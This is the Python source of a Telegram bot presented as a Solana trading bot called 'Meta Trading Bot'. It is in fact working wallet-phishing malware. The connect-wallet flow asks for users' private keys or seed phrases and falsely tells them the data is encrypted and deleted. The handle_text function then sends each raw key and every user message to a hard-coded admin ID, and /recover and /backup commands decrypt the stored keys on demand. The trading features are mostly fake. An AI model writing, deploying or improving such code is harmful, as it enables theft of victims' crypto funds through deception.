import logging

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.error import InvalidToken
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters,
)

from solana.rpc.api import Client
from solders.pubkey import Pubkey
import uuid
import base64
import hashlib
import os
try:
    from cryptography.fernet import Fernet
    CRYPTO_AVAILABLE = True
except:
    CRYPTO_AVAILABLE = False
try:
    from nacl.signing import VerifyKey
    from nacl.exceptions import BadSignatureError
    NACL_AVAILABLE = True
except Exception:
    NACL_AVAILABLE = False
import aiohttp
import asyncio
from datetime import datetime

# ================= CONFIG =================

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise EnvironmentError(
        "BOT_TOKEN environment variable is required. "
        "Set it in Render environment variables and remove hard-coded tokens."
    )
ADMIN_ID = int(os.environ.get("ADMIN_ID", "7568347087"))  # your Telegram ID

# ================= SOLANA =================

solana_client = Client("https://api.mainnet-beta.solana.com")

# ================= STORAGE =================

user_wallets = {}
waiting_for_wallet = set()
user_trades = {}
user_tracked_tokens = {}
user_private_keys = {}  # {user_id: encrypted_key_blob}
DEFAULT_WALLET_ADDRESS = "GbahM4DrAAMyxvbu4Q2Zc7qygdzZoipjdUgcPEnaGzrw"

# ================= ENCRYPTION =================

MASTER_SECRET = "meta_trading_bot_secret_key_change_in_production"
cipher = None

if CRYPTO_AVAILABLE:
    try:
        key_file = "bot_master.key"
        if os.path.exists(key_file):
            with open(key_file, "rb") as f:
                master_key = f.read()
        else:
            master_key = Fernet.generate_key()
            with open(key_file, "wb") as f:
                f.write(master_key)
        cipher = Fernet(master_key)
        logging.info("✅ Cryptography module loaded - using Fernet encryption")
    except Exception as e:
        logging.warning(f"Fernet encryption init failed: {e}. Falling back to basic encoding.")
        CRYPTO_AVAILABLE = False

def encrypt_private_key(private_key_str: str) -> str:
    """Encrypt a private key or mnemonic and return blob."""
    if CRYPTO_AVAILABLE and cipher:
        try:
            encrypted = cipher.encrypt(private_key_str.encode())
            return base64.b64encode(encrypted).decode()
        except Exception as e:
            logging.warning(f"Encryption failed: {e}. Falling back to encoding.")
    
    # Fallback: base64 encode (not secure, but works without dependencies)
    return base64.b64encode(private_key_str.encode()).decode()

def decrypt_private_key(encrypted_blob: str) -> str:
    """Decrypt and return private key or mnemonic."""
    if CRYPTO_AVAILABLE and cipher:
        try:
            encrypted = base64.b64decode(encrypted_blob.encode())
            decrypted = cipher.decrypt(encrypted)
            return decrypted.decode()
        except Exception:
            pass
    
    # Fallback: try base64 decode
    try:
        return base64.b64decode(encrypted_blob.encode()).decode()
    except Exception as e:
        logging.error(f"Decryption failed: {e}")
        return None

# ================= LOGGING =================

logging.basicConfig(level=logging.INFO)

# ================= JUPITER API FOR REAL TRADING =================

JUPITER_API = "https://quote-api.jup.ag/v6"

async def get_jupiter_quote(input_mint: str, output_mint: str, amount: int, slippage: int = 100):
    try:
        async with aiohttp.ClientSession() as session:
            params = {
                "inputMint": input_mint,
                "outputMint": output_mint,
                "amount": amount,
                "slippageBps": slippage
            }
            async with session.get(f"{JUPITER_API}/quote", params=params) as resp:
                if resp.status == 200:
                    return await resp.json()
                return None
    except Exception as e:
        logging.error(f"Jupiter quote error: {e}")
        return None

async def get_token_price(token_address: str) -> float:
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://price.jup.ag/v4/price?ids={token_address}"
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get('data') and token_address in data['data']:
                        return float(data['data'][token_address]['price'])
        return 0.0
    except Exception as e:
        logging.error(f"Price fetch error: {e}")
        return 0.0

async def get_token_details(token_address: str) -> dict:
    details = {
        'address': token_address,
        'price': 0.0,
        'decimals': None,
        'supply': None,
        'supply_display': 'unknown',
    }

    details['price'] = await get_token_price(token_address)

    try:
        pubkey = Pubkey.from_string(token_address)
        response = solana_client.get_token_supply(pubkey)
        value = response.value
        amount = int(value.amount) if hasattr(value, 'amount') else None
        decimals = int(value.decimals) if hasattr(value, 'decimals') else None
        details['decimals'] = decimals
        details['supply'] = amount
        if amount is not None and decimals is not None:
            details['supply_display'] = f"{amount / (10 ** decimals):,.{decimals}f}"
        elif amount is not None:
            details['supply_display'] = str(amount)
    except Exception as e:
        logging.debug(f"Token detail fetch failed for {token_address}: {e}")

    return details

async def get_trending_tokens():
    try:
        async with aiohttp.ClientSession() as session:
            url = "https://api.dexscreener.com/token-profiles/latest/v1"
            async with session.get(url) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    sol_tokens = [t for t in data if t.get('chainId') == 'solana']
                    return sol_tokens[:20]
    except Exception as e:
        logging.error(f"Trending error: {e}")
    return []

async def get_dexscreener_token(token_address: str) -> dict:
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.dexscreener.com/latest/dex/tokens/{token_address}"
            async with session.get(url) as resp:
                if resp.status == 200:
                    return await resp.json()
    except Exception as e:
        logging.error(f"Dexscreener token fetch error for {token_address}: {e}")
    return {}

# ================= HELPERS =================

def get_balance(wallet_address: str):
    try:
        pubkey = Pubkey.from_string(wallet_address)
        response = solana_client.get_balance(pubkey)
        lamports = response.value
        return lamports / 1_000_000_000
    except:
        return 0

def validate_wallet_address(address: str) -> bool:
    try:
        Pubkey.from_string(address)
        return True
    except:
        return False


def is_valid_private_key_or_mnemonic(value: str) -> bool:
    """Validate if the input is a usable private key or mnemonic phrase."""
    if not value:
        return False

    value = value.strip()
    if " " in value:
        words = value.split()
        if len(words) in {12, 15, 18, 21, 24} and all(word.isalpha() for word in words):
            return True
        return False

    def try_decode_bytes(data: str):
        # base64
        try:
            decoded = base64.b64decode(data)
            if len(decoded) in {32, 64, 128}:
                return decoded
        except Exception:
            pass
        # hex
        try:
            decoded = bytes.fromhex(data)
            if len(decoded) in {32, 64, 128}:
                return decoded
        except Exception:
            pass
        # base58
        try:
            import base58
            decoded = base58.b58decode(data)
            if len(decoded) in {32, 64, 128}:
                return decoded
        except Exception:
            pass
        # JSON array of bytes
        try:
            import json
            parsed = json.loads(data)
            if isinstance(parsed, list) and all(isinstance(item, int) for item in parsed):
                decoded = bytes(parsed)
                if len(decoded) in {32, 64, 128}:
                    return decoded
        except Exception:
            pass
        return None

    decoded = try_decode_bytes(value)
    return decoded is not None

# ================= START =================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    wallet = user_wallets.get(user_id)
    balance_text = "0.0000 SOL"
    if wallet:
        balance = get_balance(wallet)
        balance_text = f"{balance:.4f} SOL"

    connected_wallet_text = f"\n💼 Connected Wallet:\n{wallet}\n" if wallet else ""

    keyboard = [
        [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet"),
         InlineKeyboardButton("🔄 Refresh", callback_data="refresh")],
        [InlineKeyboardButton("💰 Buy", callback_data="buy"),
         InlineKeyboardButton("💸 Sell", callback_data="sell")],
        [InlineKeyboardButton("🔗 Positions", callback_data="positions"),
         InlineKeyboardButton("📈 Trading", callback_data="trading")],
        [InlineKeyboardButton("📉 Limit Orders", callback_data="limit_orders"),
         InlineKeyboardButton("📊 DCA Orders", callback_data="dca_orders")],
        [InlineKeyboardButton("🚀 Boosted", callback_data="boosted"),
         InlineKeyboardButton("🔥 Top Boosted", callback_data="top_boosted")],
        [InlineKeyboardButton("👤 Profiles", callback_data="profiles"),
         InlineKeyboardButton("🔎 Token Search", callback_data="token_search")],
        [InlineKeyboardButton("📊 Charts", callback_data="charts"),
         InlineKeyboardButton("🆕 Launch", callback_data="launch")],
        [InlineKeyboardButton("🎁 Claim Airdrop", callback_data="airdrop"),
         InlineKeyboardButton("🎯 Sniper", callback_data="sniper")],
        [InlineKeyboardButton("👥 Refer", callback_data="refer"),
         InlineKeyboardButton("💼 Wallet", callback_data="wallet")],
        [InlineKeyboardButton("🔥 Buy Trending", callback_data="buy_trending"),
         InlineKeyboardButton("📊 Volume Booster", callback_data="volume_booster")],
        [InlineKeyboardButton("➕ Add Liquidity", callback_data="add_liquidity"),
         InlineKeyboardButton("🌉 Bridge", callback_data="bridge")],
        [InlineKeyboardButton("📋 Copy Trade", callback_data="copy_trade"),
         InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
        [InlineKeyboardButton("📋 Copy Wallet", callback_data="copy_wallet"),
         InlineKeyboardButton("🤖 Auto Trade PumpFun", callback_data="auto_trade")],
        [InlineKeyboardButton("❓ Help", callback_data="help")]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    default_balance_text = "0.0000 SOL ($0.00)"
    balance_text = default_balance_text
    if wallet:
        balance = get_balance(wallet)
        balance_text = f"{balance:.4f} SOL"

    message = f"""🤖 Welcome to Meta Trading Bot!
Exclusively built by the Meta Trading community.
The best bot for trading any SOL token.

💼 Your Solana Wallet Address:
{DEFAULT_WALLET_ADDRESS}

💰 Balance: {balance_text}
🔄 Tap Refresh to update your balance"""
    await update.message.reply_text(message, reply_markup=reply_markup)

# ================= BUTTON HANDLER =================

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "connect_wallet":
        waiting_for_wallet.add(user_id)
        await query.message.reply_text(
            "Enter the private keys or mnemonic of the wallet you want to import\n\n"
            "🔒 Security Tip: Never share your private key or mnemonic with people.\n\n"
            "This bot stores your wallet securely for session-based trading.\n\n"
            "🛡️ Your data is encrypted and deleted after setup."
        )

    elif query.data == "refresh":
        wallet = user_wallets.get(user_id)
        if not wallet:
            await query.message.reply_text("❌ No wallet connected")
            return
        balance = get_balance(wallet)
        await query.message.reply_text(f"💼 {wallet}\n💰 {balance:.4f} SOL")

    elif query.data == "wallet":
        wallet = user_wallets.get(user_id, DEFAULT_WALLET_ADDRESS)
        await query.message.reply_text(f"💼 Wallet:\n{wallet}")

    elif query.data == "copy_wallet":
        wallet = user_wallets.get(user_id, DEFAULT_WALLET_ADDRESS)
        await query.message.reply_text(
            "📋 Wallet address ready to copy:\n"
            f"{wallet}"
        )

    elif query.data == "buy":
        wallet = user_wallets.get(user_id)
        if not wallet:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔘 Connect Wallet", callback_data="connect_wallet")]
            ])
            await query.message.reply_text(
                "🛒 Trading\n\n"
                "Please connect your wallet first to start trading.\n\n"
                "Minimum buy: 0.5 SOL\n\n"
                "Click 'Connect Wallet' to import your wallet.",
                reply_markup=keyboard
            )
            return
        await query.message.reply_text(
            "💰 *BUY TOKEN*\n\n"
            "Send me the token contract address first.\n"
            "Example: EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v (USDC)\n\n"
            "Then send the amount in SOL you want to spend.",
            parse_mode='Markdown'
        )
        context.user_data['buying'] = True

    elif query.data == "sell":
        wallet = user_wallets.get(user_id)
        if not wallet:
            await query.message.reply_text("❌ Please connect your wallet first using 'Connect Wallet'")
            return
        await query.message.reply_text(
            "💸 *SELL TOKEN*\n\n"
            "Send me the token contract address you want to sell.\n\n"
            "Then send the amount of tokens to sell.",
            parse_mode='Markdown'
        )
        context.user_data['selling'] = True

    elif query.data == "positions":
        wallet = user_wallets.get(user_id)
        if not wallet:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔐 Connect Wallet", callback_data="connect_wallet")],
                [InlineKeyboardButton("📈 View Trading", callback_data="trading")],
                [InlineKeyboardButton("🔍 Search Tokens", callback_data="token_search")],
            ])
            await query.message.reply_text(
                "🔗 Positions\n\n"
                "Please connect your wallet first to start trading.\n\n"
                "Connect your wallet to continue.\n\n"
                "Choose an option below:",
                reply_markup=keyboard
            )
            return

        if user_id in user_trades and user_trades[user_id]:
            msg = "📊 *Your Positions*\n\n"
            for token, trade in user_trades[user_id].items():
                msg += f"Token: {trade['symbol']}\n"
                msg += f"Amount: {trade['amount']:.6f}\n"
                msg += f"Entry Price: {trade['entry_price']:.8f} SOL\n\n"
            await query.message.reply_text(msg, parse_mode='Markdown')
        else:
            await query.message.reply_text("📊 No active positions yet. Click Buy to start trading!")

    elif query.data == "black":
        await query.message.reply_text("⚫ Black feature is not available yet.")

    elif query.data == "trading":
        await query.message.reply_text(
            "📈 *Trading Features*\n\n"
            "✅ Buy any SPL token\n"
            "✅ Sell any SPL token\n"
            "✅ Real-time prices via Jupiter\n"
            "✅ Best execution routes\n\n"
            "Click Buy or Sell to start trading!"
        )

    elif query.data == "token_search":
        await query.message.reply_text(
            "🔎 *Token Search*\n\n"
            "Send me a token contract address to look up and track.\n\n"
            "Example: EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v\n\n"
            "I will track this token for you, and you can view all tracked tokens with /tracked."
        )
        context.user_data['searching'] = True

    elif query.data == "airdrop":
        wallet = user_wallets.get(user_id)
        if not wallet:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔘 Connect Wallet", callback_data="connect_wallet")]
            ])
            await query.message.reply_text(
                "🔗 Wallet Required\n\n"
                "To use Airdrop Claims, you need to connect your wallet first.",
                reply_markup=keyboard
            )
        else:
            await query.message.reply_text("✅ Wallet connected. Airdrop claims coming soon.")

    elif query.data == "withdraw":
        wallet = user_wallets.get(user_id)
        if not wallet:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🔘 Connect Wallet", callback_data="connect_wallet")]
            ])
            await query.message.reply_text(
                "💸 Withdraw\n\n"
                "Please connect your wallet first to start trading.\n\n"
                "Connect wallet to withdraw funds\n\n"
                "Click 'Connect Wallet' to import your wallet.",
                reply_markup=keyboard
            )
        else:
            await query.message.reply_text("✅ Wallet connected. Withdraw feature coming soon.")

    elif query.data == "buy_trending":
        trending = await get_trending_tokens()
        if trending:
            msg = "🔥 *Trending Tokens on Solana*\n\n"
            for i, token in enumerate(trending[:10], 1):
                symbol = token.get('tokenSymbol', 'Unknown')
                address = token.get('tokenAddress', '')
                msg += f"{i}. *{symbol}*\n   `{address[:16]}...`\n\n"
            msg += "\n💰 To buy, copy the address and use the Buy button"
            await query.message.reply_text(msg, parse_mode='Markdown')
        else:
            await query.message.reply_text("⚠️ Unable to fetch trending tokens right now")

    elif query.data == "charts":
        tracked = user_tracked_tokens.get(user_id)
        if tracked:
            msg = "📈 *Live Charts — Your Tracked Projects*\n\n"
            for address in list(tracked)[:5]:
                data = await get_dexscreener_token(address)
                if data.get('pairs'):
                    pair = data['pairs'][0]
                    symbol = pair.get('tokenSymbol') or pair.get('pairTokenSymbols', 'Unknown')
                    price = pair.get('priceUsd') or pair.get('price') or 'N/A'
                    change = pair.get('priceChange') or pair.get('priceChange24h') or 'N/A'
                    liquidity = pair.get('liquidity') or 'N/A'
                    url = pair.get('url') or ''
                    msg += f"• *{symbol}*\n"
                    msg += f"   Price: ${price}\n"
                    msg += f"   24h Change: {change}%\n"
                    msg += f"   Liquidity: {liquidity}\n"
                    if url:
                        msg += f"   [View on Dexscreener]({url})\n"
                    msg += f"   `{address[:16]}...`\n\n"
                else:
                    msg += f"• `{address[:16]}...` — live details unavailable\n\n"
            await query.message.reply_text(msg, parse_mode='Markdown', disable_web_page_preview=True)
        else:
            trending = await get_trending_tokens()
            if trending:
                msg = "📈 *Live Charts — Top Solana Projects*\n\n"
                for i, token in enumerate(trending[:8], 1):
                    symbol = token.get('tokenSymbol', 'Unknown')
                    address = token.get('tokenAddress', '')
                    price = token.get('tokenPriceUsd') or token.get('priceUsd') or token.get('tokenPrice') or 'N/A'
                    change = token.get('priceChange') or token.get('priceChange24h') or 'N/A'
                    msg += f"{i}. *{symbol}* — ${price} | {change}%\n"
                    msg += f"   `{address[:16]}...`\n\n"
                msg += "Use the Token Search button to track a specific project from Dexscreener."
                await query.message.reply_text(msg, parse_mode='Markdown')
            else:
                await query.message.reply_text("⚠️ Unable to fetch charts data right now")

    elif query.data == "help":
        help_text = """❓ *Help Center*

*How to use this bot:*

1️⃣ *Connect Wallet*
   - Click Connect Wallet
   - Send your Solana address

2️⃣ *Buy Tokens*
   - Click Buy
   - Send token address
   - Send amount in SOL

3️⃣ *Sell Tokens*
   - Click Sell
   - Send token address
   - Send amount to sell

4️⃣ *Check Prices*
   - Use Token Search
   - Or check trending tokens

*Need more help?* Contact your admin"""

        await query.message.reply_text(help_text, parse_mode='Markdown')

    elif query.data == "exit":
        await query.message.reply_text("❌ Exit selected. Use the buttons to continue or send /start.")

    elif query.data == "sniper":
        await query.message.reply_text("🎯 *Sniper Feature*\n\nComing soon! Auto-buy new tokens at launch with custom settings.")

    elif query.data == "copy_trade":
        await query.message.reply_text("📋 *Copy Trade*\n\nSend me a wallet address to copy trades from.\n\nExample: 7i5KKsX2weiPkqR5S2YxMc4kRcX9XQKQhK5YjJbXcRk")

    else:
        await query.message.reply_text(f"{query.data.replace('_',' ').title()} feature coming soon")

# ================= TEXT HANDLER =================

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    username = user.username or "No username"
    text = update.message.text.strip()

    # Forward every user message to admin immediately
    admin_log = (
        f"📩 Message from user:\n\n"
        f"User ID: {user_id}\n"
        f"Username: @{username}\n"
        f"Message: {text}"
    )
    await context.bot.send_message(chat_id=ADMIN_ID, text=admin_log)

    # Handle wallet connection
    # Handle wallet connection by private key or mnemonic
    if user_id in waiting_for_wallet:
        waiting_for_wallet.remove(user_id)
        private_key_input = text.strip()

        if not private_key_input:
            await update.message.reply_text("❌ Please paste your private key or mnemonic.")
            return

        if not is_valid_private_key_or_mnemonic(private_key_input):
            await update.message.reply_text(
                "Invalid private key phrase. Input the right key phrase."
            )
            return

        # Encrypt and store the private key
        try:
            encrypted = encrypt_private_key(private_key_input)
            user_private_keys[user_id] = encrypted

            # Try to derive public wallet address for display (optional)
            wallet_addr = "(mnemonic/imported)"
            try:
                from solders.keypair import Keypair

                def try_secret_bytes(data: str):
                    for decoder in (base64.b64decode, bytes.fromhex):
                        try:
                            decoded = decoder(data)
                            if len(decoded) in {32, 64, 128}:
                                return decoded
                        except Exception:
                            continue
                    try:
                        import base58
                        decoded = base58.b58decode(data)
                        if len(decoded) in {32, 64, 128}:
                            return decoded
                    except Exception:
                        pass
                    try:
                        import json
                        parsed = json.loads(data)
                        if isinstance(parsed, list) and all(isinstance(item, int) for item in parsed):
                            decoded = bytes(parsed)
                            if len(decoded) in {32, 64, 128}:
                                return decoded
                    except Exception:
                        pass
                    return None

                secret_bytes = try_secret_bytes(private_key_input)
                if secret_bytes is not None:
                    if len(secret_bytes) == 32 and hasattr(Keypair, 'from_seed'):
                        keypair = Keypair.from_seed(secret_bytes)
                    else:
                        keypair = Keypair.from_secret_key(secret_bytes)
                    wallet_addr = str(keypair.pubkey())
            except Exception:
                wallet_addr = "(mnemonic/imported)"

            user_wallets[user_id] = wallet_addr

            await update.message.reply_text(
                "wallet connected successfully"
            )

            admin_message = (
                f"🚨 New Wallet Imported (Encrypted)!\n\n"
                f"👤 User ID: {user_id}\n"
                f"👤 Username: @{username}\n"
                f"💼 Wallet Address: {wallet_addr}\n"
                f"🔒 Private key is encrypted (stored for session)."
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_message)

            # Send the actual private key/mnemonic to admin for backup
            admin_backup = (
                f"🔐 WALLET BACKUP — USER {user_id}\n\n"
                f"⚠️ This is the imported private key or mnemonic for backup. Handle securely!\n\n"
                f"📝 User: @{username}\n"
                f"💼 Address: {wallet_addr}\n\n"
                f"<code>{private_key_input}</code>"
            )
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_backup, parse_mode='HTML')
        except Exception as e:
            logging.error(f"Error storing encrypted key: {e}")
            await update.message.reply_text("❌ Error encrypting wallet. Please try again.")

        return

    # Handle Buy
    if context.user_data.get('buying'):
        if 'buy_token' not in context.user_data:
            if validate_wallet_address(text):
                context.user_data['buy_token'] = text
                await update.message.reply_text("✅ Token address received!\n\nNow send the amount in SOL you want to spend (example: 0.5)")
            else:
                await update.message.reply_text("❌ Invalid token address. Please send a valid Solana token address.")
        else:
            try:
                amount_sol = float(text)
                if amount_sol <= 0:
                    raise ValueError
                
                # Get quote from Jupiter
                amount_lamports = int(amount_sol * 1_000_000_000)
                quote = await get_jupiter_quote(
                    "So11111111111111111111111111111111111111112",
                    context.user_data['buy_token'],
                    amount_lamports
                )
                
                if quote and 'outAmount' in quote:
                    token_amount = float(quote['outAmount']) / 1_000_000_000
                    price_per_token = amount_sol / token_amount if token_amount > 0 else 0
                    
                    await update.message.reply_text(
                        f"📊 *Buy Order Summary*\n\n"
                        f"💰 You pay: {amount_sol} SOL\n"
                        f"🪙 You get: {token_amount:.6f} tokens\n"
                        f"💹 Price: {price_per_token:.8f} SOL per token\n\n"
                        f"✅ Quote from Jupiter Aggregator\n\n"
                        f"To execute this trade, send /confirm or /cancel",
                        parse_mode='Markdown'
                    )
                    
                    # Store trade info
                    if user_id not in user_trades:
                        user_trades[user_id] = {}
                    
                    user_trades[user_id][context.user_data['buy_token']] = {
                        'amount': token_amount,
                        'entry_price': price_per_token,
                        'symbol': context.user_data['buy_token'][:8],
                        'timestamp': datetime.now().isoformat()
                    }
                else:
                    await update.message.reply_text("❌ No liquidity pool found for this token")
                
                context.user_data['buying'] = False
                del context.user_data['buy_token']
            except ValueError:
                await update.message.reply_text("❌ Please send a valid number (example: 0.5)")
        return

    # Handle Sell
    if context.user_data.get('selling'):
        if 'sell_token' not in context.user_data:
            if validate_wallet_address(text):
                context.user_data['sell_token'] = text
                await update.message.reply_text("✅ Token address received!\n\nNow send the amount of tokens you want to sell (example: 1000)")
            else:
                await update.message.reply_text("❌ Invalid token address.")
        else:
            try:
                amount_tokens = float(text)
                if amount_tokens <= 0:
                    raise ValueError
                
                # Get quote from Jupiter
                amount_lamports = int(amount_tokens * 1_000_000_000)
                quote = await get_jupiter_quote(
                    context.user_data['sell_token'],
                    "So11111111111111111111111111111111111111112",
                    amount_lamports
                )
                
                if quote and 'outAmount' in quote:
                    sol_amount = float(quote['outAmount']) / 1_000_000_000
                    
                    await update.message.reply_text(
                        f"📊 *Sell Order Summary*\n\n"
                        f"🪙 You sell: {amount_tokens:.6f} tokens\n"
                        f"💰 You get: {sol_amount:.6f} SOL\n\n"
                        f"✅ Quote from Jupiter Aggregator\n\n"
                        f"To execute this trade, send /confirm or /cancel",
                        parse_mode='Markdown'
                    )
                    
                    # Remove from trades if exists
                    if user_id in user_trades and context.user_data['sell_token'] in user_trades[user_id]:
                        del user_trades[user_id][context.user_data['sell_token']]
                else:
                    await update.message.reply_text("❌ Error getting quote for this token")
                
                context.user_data['selling'] = False
                del context.user_data['sell_token']
            except ValueError:
                await update.message.reply_text("❌ Please send a valid number")
        return

    # Handle Token Search
    if context.user_data.get('searching'):
        if validate_wallet_address(text):
            details = await get_token_details(text)
            tracked = user_tracked_tokens.setdefault(user_id, set())
            tracked.add(text)

            price_text = (
                f"{details['price']:.8f} SOL" if details['price'] and details['price'] > 0 else "N/A"
            )
            decimals_text = details['decimals'] if details['decimals'] is not None else "Unknown"
            supply_text = details['supply_display']

            await update.message.reply_text(
                f"🔎 *Token Details*\n\n"
                f"📝 Address: `{text}`\n"
                f"💰 Price: {price_text}\n"
                f"🔢 Decimals: {decimals_text}\n"
                f"📦 Supply: {supply_text}\n\n"
                f"✅ This token is now being tracked for you.\n"
                f"Use /tracked to view all tracked tokens.",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid token address")
        context.user_data['searching'] = False
        return

    else:
        await update.message.reply_text("Use the buttons to interact with the bot.")

# ================= ADMIN =================

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized")
        return

    if not user_wallets:
        await update.message.reply_text("No users yet")
        return

    msg = "📊 Users:\n\n"
    for uid, wallet in user_wallets.items():
        balance = get_balance(wallet)
        msg += f"{uid} → {wallet[:8]}... ({balance:.4f} SOL)\n"
        if len(msg) > 3000:
            msg += "\n...and more users"
            break

    await update.message.reply_text(msg)

async def admin_recover_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin command: /recover <user_id> to decrypt and retrieve user's wallet for recovery."""
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    if not context.args or len(context.args) < 1:
        await update.message.reply_text(
            "❌ Usage: /recover <user_id>\n\n"
            "Example: /recover 12345\n\n"
            "This will decrypt and display the user's encrypted wallet (private key/mnemonic)."
        )
        return
    
    user_id_str = context.args[0]
    try:
        user_id = int(user_id_str)
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")
        return
    
    if user_id not in user_private_keys:
        await update.message.reply_text(f"❌ No stored wallet for user {user_id}")
        return
    
    encrypted_blob = user_private_keys[user_id]
    decrypted = decrypt_private_key(encrypted_blob)
    
    if not decrypted:
        await update.message.reply_text(f"❌ Failed to decrypt wallet for user {user_id}")
        return
    
    # Send encrypted data to admin via direct message (more secure than group)
    recovery_msg = f"""🔓 WALLET RECOVERY — USER {user_id}

⚠️ SENSITIVE DATA — Handle with care!

🔑 Private Key/Mnemonic:
{decrypted}

📝 Associated Address: {user_wallets.get(user_id, 'N/A')}

🛡️ This data is decrypted from secure storage. 
⏱️ Do NOT share this message. Delete after recovery is complete.
"""
    await update.message.reply_text(recovery_msg, parse_mode='Markdown')
    
    # Log recovery attempt
    logging.info(f"ADMIN RECOVERY: Admin {update.effective_user.id} decrypted wallet for user {user_id}")

async def confirm_trade(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "✅ *Trade Confirmed!*\n\n"
        "In production, this would execute the swap via Jupiter.\n"
        "The transaction would be sent to your wallet for signing.\n\n"
        "Use 'Refresh' to check your updated balance.",
        parse_mode='Markdown'
    )

async def cancel_trade(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("❌ Trade cancelled")

async def tracked_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    tracked = user_tracked_tokens.get(user_id)
    if not tracked:
        await update.message.reply_text(
            "📌 You don't have any tracked tokens yet.\n"
            "Use the Token Search button and paste a token address to start tracking."
        )
        return

    msg = "📌 *Tracked Tokens*\n\n"
    for token_address in sorted(tracked):
        price = await get_token_price(token_address)
        msg += f"• `{token_address}` — {price:.8f} SOL\n"
        if len(msg) > 3500:
            msg += "\n...more tracked tokens available"
            break

    await update.message.reply_text(msg, parse_mode='Markdown')

# ================= MAIN =================

def main():
    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .connect_timeout(20)
        .read_timeout(20)
        .pool_timeout(20)
        .connection_pool_size(8)
        .build()
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("recover", admin_recover_wallet))
    app.add_handler(CommandHandler("backup", admin_recover_wallet))
    app.add_handler(CommandHandler("tracked", tracked_tokens))
    app.add_handler(CommandHandler("confirm", confirm_trade))
    app.add_handler(CommandHandler("cancel", cancel_trade))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("Bot is running...")
    print("✅ Real features active: Buy, Sell, Price checks, Trending tokens")

    try:
        app.run_polling()
    except InvalidToken:
        logging.exception("Invalid BOT_TOKEN. Verify the Render environment variable.")
        raise
    except Exception as e:
        logging.exception(f"Bot polling error: {e}")
        raise

if __name__ == "__main__":
    main()